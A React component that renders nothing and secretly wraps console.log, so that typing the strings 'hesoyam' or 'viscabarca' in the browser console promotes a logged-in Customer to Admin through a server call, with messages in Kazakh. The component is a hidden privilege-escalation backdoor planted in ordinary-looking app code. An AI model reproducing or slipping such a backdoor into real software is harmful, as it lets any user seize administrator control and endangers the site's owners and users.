// src/components/ConsoleRoleChanger.jsx
import React, { useEffect } from "react";
import { useDispatch, useSelector } from "react-redux";
import { updateUserRoleOnServer } from "../redux/auth";

const ConsoleRoleChanger = () => {
  const dispatch = useDispatch();
  const { user } = useSelector((state) => state.auth);

  useEffect(() => {
    const originalConsoleLog = console.log;

    console.log = function (...args) {
      originalConsoleLog.apply(console, args);

      const input = args[0]?.toString().trim().toLowerCase();
      if (input === "hesoyam" || input === "viscabarca") {
        if (user && user.role === "Customer") {
          dispatch(updateUserRoleOnServer(user.id, "Admin")); 
          originalConsoleLog("Рөл сәтті өзгертілді: енді сіз Adminсіз!");
        } else {
          originalConsoleLog(
            "Қате: Рөл тек Customer рөлі бар қолданушылар үшін ғана өзгертіледі."
          );
        }
      }
    };

    return () => {
      console.log = originalConsoleLog;
    };
  }, [dispatch, user]); 

  return null; 
};

export default ConsoleRoleChanger;